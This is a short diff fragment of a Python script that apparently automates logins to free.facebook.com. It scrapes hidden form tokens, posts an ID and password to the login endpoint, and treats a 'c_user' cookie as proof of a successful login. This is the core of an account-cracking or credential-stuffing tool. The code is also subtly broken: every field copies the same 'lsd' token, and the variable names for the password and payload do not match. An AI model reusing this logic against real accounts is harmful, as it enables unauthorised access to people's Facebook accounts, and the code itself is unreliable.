@@ -1242,12 +1242,11 @@ def m6(idf,pwv):
    "width":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "pxr":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "gps":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "dimensions":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    "m_ts":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
-   data['email'] = idf
-   data['pass'] = ps
-   data['login'] = 'Log In'  
+   "li":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "email":idf,
+   "pass":pw,
+   "login":"Log In"} 
    lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
